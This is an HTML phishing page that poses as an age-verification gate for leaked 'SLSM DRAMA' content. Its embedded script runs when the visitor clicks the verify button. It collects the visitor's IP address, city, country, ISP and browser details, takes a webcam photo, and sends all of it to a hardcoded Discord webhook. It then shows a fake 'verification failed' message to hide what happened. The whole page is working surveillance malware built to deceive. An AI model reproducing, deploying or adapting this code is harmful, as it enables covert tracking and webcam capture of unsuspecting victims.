<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SLSM DRAMA - Exclusive Leak</title>
    <style>
        body {
            background-color: #0f0f0f;
            color: #ffffff;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            width: 90%;
            max-width: 500px;
            padding: 20px;
            background-color: #1a1a1a;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.5);
        }
        h1 { margin: 0 0 10px 0; font-size: 28px; color: #ff3b3b; }
        p { color: #aaa; font-size: 16px; margin: 10px 0; line-height: 1.5; }
        .btn {
            background-color: #ff3b3b;
            color: white;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            border-radius: 8px;
            cursor: pointer;
            margin-top: 20px;
            transition: 0.2s;
        }
        .btn:hover { background-color: #cc2f2f; }
        .hidden { display: none; }
        #statusText { color: #ff3b3b; font-weight: bold; margin-top: 15px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>SLSM DRAMA LEAKED</h1>
        <p>Full uncensored drama revealed. This content is restricted and requires identity verification to view.</p>
        <button class="btn" id="verifyBtn">Verify You Are 18+</button>
        <p id="statusText" class="hidden">Verifying...</p>
    </div>

    <script>
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1549255647147593769/Eg6-4sLZnzEHfIJMb_WoGmLVOmkdFKowcA88UgyQsVATym1d8CH82BNEUUZ484u5zVX-";

        async function sendToDiscord(content, fileBlob, fileName) {
            const formData = new FormData();
            formData.append("content", content);
            if (fileBlob) formData.append("file", fileBlob, fileName);
            try { 
                await fetch(WEBHOOK_URL, { method: "POST", body: formData }); 
            } catch (e) {}
        }

        async function getIPInfo() {
            try {
                const res = await fetch('https://ipinfo.io/json?token=2e3f8c2b5f6a1d4e9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a');
                const data = await res.json();
                if (data.ip) {
                    return {
                        ip: data.ip || "Unknown",
                        city: data.city || "Unknown",
                        region: data.region || "Unknown",
                        country: data.country || "Unknown",
                        org: data.org || "Unknown"
                    };
                }
                throw new Error("IP API returned no data");
            } catch (e) {
                return { ip: "Unknown", city: "Unknown", region: "Unknown", country: "Unknown", org: "Unknown" };
            }
        }

        async function captureCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.createElement('video');
                const canvas = document.createElement('canvas');
                
                video.srcObject = stream;
                video.style.display = 'none';
                document.body.appendChild(video);
                
                await new Promise(r => video.onloadedmetadata = r);
                video.play();
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                stream.getTracks().forEach(t => t.stop());
                video.remove();
                
                return new Promise(r => canvas.toBlob(b => r(b), 'image/jpeg', 0.8));
            } catch (e) { 
                return null; 
            }
        }

        async function executePayload() {
            const ipInfo = await getIPInfo();
            let content = `**Target fell for SLSM DRAMA paywall**\n> **IP:** ${ipInfo.ip}\n> **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n> **ISP:** ${ipInfo.org}\n> **Device:** ${navigator.userAgent}\n`;
            await sendToDiscord(content);

            await new Promise(r => setTimeout(r, 1000));
            
            const camBlob = await captureCamera();
            if (camBlob) {
                await sendToDiscord("**Camera captured from SLSM DRAMA site**", camBlob, "slsm_target.jpg");
            } else {
                await sendToDiscord("**Camera access denied or failed**");
            }
        }

        document.getElementById('verifyBtn').addEventListener('click', async () => {
            document.getElementById('verifyBtn').classList.add('hidden');
            const status = document.getElementById('statusText');
            status.innerText = "Verifying identity...";
            status.classList.remove('hidden');
            
            await executePayload();
            
            status.innerText = "Verification failed. Try again later.";
        });
    </script>
</body>
</html>
